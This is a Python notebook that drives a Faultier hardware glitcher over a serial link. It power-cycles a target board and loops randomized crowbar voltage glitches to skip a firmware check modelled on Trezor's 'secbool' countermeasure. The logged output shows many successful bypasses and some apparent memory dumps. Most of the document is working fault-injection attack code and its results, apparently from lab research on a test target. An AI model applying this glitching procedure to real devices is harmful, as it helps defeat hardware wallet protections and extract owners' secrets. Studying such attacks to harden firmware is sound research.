# %%
import faultier
import serial
import time

ft = faultier.Faultier()
ser = serial.Serial(ft.get_serial_path(), baudrate=115200)
ser.timeout = 0.05

# %%
ser.reset_input_buffer()

ft.configure_glitcher(
    power_cycle_output = faultier.OUT_MUX0,
    power_cycle_length = 300000
)

ft.power_cycle()
d = ser.readline()
print(d)
# ser.write(b"TEST\r\n")
# d = ser.readline()
# print(d)
# Out:
# b'FATAL ERROR: CMAKE_SOURCE_DIR/src/countermeasure_secbool.c:25 - Not true!!\r\n'

# %%
ft.configure_glitcher(
    trigger_source = faultier.TRIGGER_NONE,
    trigger_type = faultier.TRIGGER_NONE,
    glitch_output= faultier.OUT_CROWBAR
)

expected = b'FATAL ERROR: CMAKE_SOURCE_DIR/src/countermeasure_secbool.c:25 - Not true!!\r\n'

import random

while True:
    delay = random.randint(610000, 615000+9000)
    pulse = random.randint(9, 14)

    # Flush potentially left-over data in serial input buffer
    ser.reset_input_buffer()

    ft.glitch(delay, pulse)

    data = ser.read(len(expected))
    if(data == b''):
        time.sleep(0.05)
        continue
    if(data != expected):
        print(f"{delay} {pulse} Success! {data} {ser.read(100)}")
# Out:
# 619859 14 Success! b'F' b''
# 619930 10 Success! b'F' b''
# 611829 14 Success! b'F' b''
# 615695 9 Success! b'FATAL ERROR: CMAKE_SOURCE_DIR/src/countermeasure_secbool.c:25 - \r\nSuccessful' b"ly bypassed Trezor's secbool!\r\n"
# 620516 11 Success! b'F' b''
# 623257 11 Success! b'F' b''
# 618578 14 Success! b'F' b''
# 613150 13 Success! b'FATAL ERROR: CMAKE_SOURCE_DIR/src/countermeasure_secbool.c:25 - Not true!! \r' b"\nSuccessfully bypassed Trezor's secbool!\r\n"
# 617203 14 Success! b'F' b''
# 619000 9 Success! b'F' b''
# 619418 11 Success! b'F' b''
# 622542 12 Success! b'F' b''
# 620886 10 Success! b'F' b''
# 622839 10 Success! b'F' b''
# 611527 13 Success! b'uccessfully bypassed TrFATAL ERROR: CMAKE_SOURCE_DIR/src/countermeasure_secb' b"ool.c:25 - Not tru030020692\r\nSuccessfully bypassed Trezor's secbool!\r\n"
# 617388 9 Success! b'essfully bypasseF' b''
# 616724 10 Success! b'F' b''
# 614496 10 Success! b'uccessfully bypassed TrF' b''
# 617668 13 Success! b'F' b''
# 618835 11 Success! b'o\xdf\xd3\x04\x18\xa9\x00\xebK\x8e\xf4\x82\x04\xa5\x82\x7f\xfe\xf3\x97@\x04\xc0\x86F' b''
# 617708 12 Success! b'F' b''
# 611413 11 Success! b'FATAL ERROR: :20729 - FATAL ERROR: CMAKE_SOURCE_DIR/src/countermeasure_secbo' b"ol.c:25 - Not true!!\r\n\r\nFSuccessfully bypassed Trezor's secbool!\r\n"
# 617133 9 Success! b'F' b''
# 623296 12 Success! b'F' b''
# 622804 9 Success! b'F' b''
# 617334 12 Success! b'FFATAL ERROR: CMAKE_SOURCE_DIR/src/countermeasure_secbool.c:25 - Not true!!\r' b"\nSuccessfully bypassed Trezor's secbool!\r\n"
# 623016 14 Success! b'F' b''
# 623549 14 Success! b'uccessfully bypassed TrF' b''
# 617575 12 Success! b'F' b''
# 615736 11 Success! b'F' b''
# 623848 13 Success! b'F' b''
# 620143 10 Success! b'uccessfully bypassed TrF' b''
# 618529 11 Success! b'F' b''
# 623136 10 Success! b'ccessfully bypassed TrF' b''
# 621550 11 Success! b'F' b''
# 611845 14 Success! b'FATAL ERROR: CMAKE_SOURCE_DIR/src/countermeasure_secbool.c:25 - ,QSuccessful' b"ly bypassed Trezor's secbool!\r\n"
# 616468 13 Success! b'uccessfully bypassed TrF' b''
# 610199 14 Success! b'uccessfully bypassed TrF' b''
# 622187 10 Success! b'\x04\x08\xa9\x00\xebK\x8e\xe4\x82\x04\xa5\x82\x7f\xfe\xf3\x97FFATAL ERROR: CMAKE_SOURCE_DIR/src/countermeasure_secbool.c:' b"25 - Not true!!\r\nSuccessfully bypassed Trezor's secbool!\r\n"
# 612868 11 Success! b'FATAL ERROR: CMAKE_SOURCE_DIR/src/countermeasure_secbool.c:25 - Not true!!No' b"t true!!\r\nSuccessfully bypassed Trezor's secbool!\r\n"
# 613620 9 Success! b'Successfully bypassed TFATAL ERROR: CMAKE_SOURCE_DIR/src/countermeasure_secb' b"ool.c:25 - Not true!!Successfully bypassed Trezor's secbool!\r\n"
# 621506 10 Success! b'F' b''
# 615836 12 Success! b'uccessfully bypassed Tr' b''
# 616196 13 Success! b'F' b''
# 610985 12 Success! b'Successfully byp' b''
# 616689 13 Success! b'F' b''
# 617417 14 Success! b'F' b''
# 619264 13 Success! b'F' b''
# 620179 10 Success! b'F' b''
# 611138 11 Success! b"essfully bypassed Trezor's seFATAL ERROR: CMAKE_SOURCE_DIR/src/countermeasur" b"e_secbool.c:536875776 -  \x80\xf3\x14\x88\xbf\xf3o\x8f\r\nSuccessfully bypassed Trezor's secbool!\r\n"
# 613551 12 Success! b'F' b''
# 610906 10 Success! b'FATAL ERROR: CMAKE_SOURCE_DIR/src/countermeasure_secbool.c:2 - Not true!!\r\nS' b"uccessfully bypassed Trezor's secbool!\r\n"
# 615975 12 Success! b'F' b''
# 613398 14 Success! b'uccessfully bypassed TrTAL ERROR: CMAKE_SOURCE_DIR/src/countermeasure_secboo' b"l.c:25 - Not true!!\r\nSuccessfully bypassed Trezor's secbool!\r\n"
# 620668 10 Success! b'F' b''
# 617780 12 Success! b'F' b''
# 616611 11 Success! b'uccessfully bypassed TrFATAL ERROR: CMAKE_SOURCE_DIR/src/countermeasure_secb' b"ool.c:25 - Not true!!\r\nSuccessfully bypassed Trezor's secbool!\r\n"
# 620687 11 Success! b'F' b''
# 622511 13 Success! b'Q\x051\x15II=I\r5\x05-\x15}M=UI\r\x15}\x11%I\xcd\xc9\x8d\x8d\xbd\xd5\xb9\xd1\x95\xc9\xb5\x95\x85\xcd\xd5\xc9\x95}\xcd\x95\x8d\x89\xbd\xbd\xb1\x8dot true!!\r\nSuccessfully by' b"passed Trezor's secbool!\r\n"
# 621276 11 Success! b'F' b''
# 620868 11 Success! b'F' b''
# 623106 9 Success! b'F' b''
# 619227 13 Success! b'uccessfully bypassed TrFATAL ERROR: CMAKE_SOURCE_DIR/src/countermeasure_secb' b"ool.c:25 - Not true!!\r\nSuccessfully bypassed Trezor's secbool!\r\n"
# 618942 14 Success! b'F' b''
# 615488 14 Success! b'F' b''
# 622212 13 Success! b'F' b''
# 621541 13 Success! b'F' b''
# 610743 10 Success! b'uccessfully bypassed TrFATAL ERROR: CMAKE_SOURCE_DIR/src/countermeasure_secb' b"ool.c:25 - Not true!!\r\nSuccessfully bypassed Trezor's secbool!\r\n"
# 620564 9 Success! b'F' b''
# 616021 10 Success! b'FFATAL ERROR: CMAKE_SOURCE_DIR/src/countermeasure_secbool.c:25 - Not true!!\r' b"\nSuccessfully bypassed Trezor's secbool!\r\n"
# 623020 13 Success! b'F' b''
# 611020 12 Success! b'FATAL ERROR: CMAKE_SOURCE_DIR/src/countermeasure_secbool.c:25 - Not true!!Su' b"ccessfully bypassed Trezor's secbool!\r\n"
# 617989 10 Success! b'essfully bypassed TrezorF' b''
# 622599 10 Success! b'F' b''
# 619167 12 Success! b'essfully bypasseF' b''
# 619820 13 Success! b'F' b''
# 621679 12 Success! b'F' b''
# 620827 13 Success! b'uccessfully bypassed TrF' b''
# 617241 12 Success! b'F' b''
# 619826 10 Success! b'F' b''
# 617284 13 Success! b'F' b''
# ---------------------------------------------------------------------------
# KeyboardInterrupt                         Traceback (most recent call last)
# Cell In[22], line 19
#      15 ser.reset_input_buffer()
#      17 ft.glitch(delay, pulse)
# ---> 19 data = ser.read(len(expected))
#      20 if(data == b''):
#      21     time.sleep(0.05)
#
# File ~/miniforge3/envs/glitching/lib/python3.13/site-packages/serial/serialposix.py:565, in Serial.read(self, size)
#     563 while len(read) < size:
#     564     try:
# --> 565         ready, _, _ = select.select([self.fd, self.pipe_abort_read_r], [], [], timeout.time_left())
#     566         if self.pipe_abort_read_r in ready:
#     567             os.read(self.pipe_abort_read_r, 1000)
#
# KeyboardInterrupt:

# %% [markdown]
# Example success:
# ```
# 613676 8 Success! b'G@\x13\x00 )\x08\x00\x003F\x00\x00\x15\x08\x00\x00\x15\x08\x00\x00\x15\x08\x00\x00\x15\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xd9\t\x00\x00\x15\x08\x00\x00\x00\x00\x00\x00\xa5\t\x00\x00\x15\x08\x00\x00e\x0b\x00\x00e\x0b\x00\x00e\x0b\x00\x00e\x0b\x00\x00e\x0b\x00\x00e\x0b\x00\x00e\x0b\x00\x00e\x0b\x00\x00e\x0b\x00\x00e\x0b\x00\x00e\x0b\x00\x00e\x0b\x00\x00e\x0b\x00\x00e\x0b\x00\x00e' b'\x0b\x00\x00e\x0b\x00\x00e\x0b\x00\x00e\x0b\x00\x00e\x0b\x00\x00e\x0b\x00\x00e\x0b\x00\x00e\x0b\x00\x00e\x0b\x00\x00e\x0b\x00\x00e\x0b\x00\x00e\x0b\x00\x00e\x0b\x00\x00e\x0b\x00\x00e\x0b\x00\x00e\x0b\x00\x00e\x0b\x00\x00e\x0b\x00\x00e\x0b\x00\x00e\x0b\x00\x00e\x0b\x00\x00e\x0b\x00\x00e\x0b\x00\x00e\x0b\x00\x00e\x0b\x00\x00G'
#
#
# 610231 12 Success! Dumped 354 bytes
# 617065 10 Success! Dumped 43 bytes
# 611091 9 Success! Dumped 357 bytes
# 615606 12 Success! Dumped 88 bytes
# 616653 12 Success! Dumped 31 bytes
# ```

# %% [markdown]
# ```
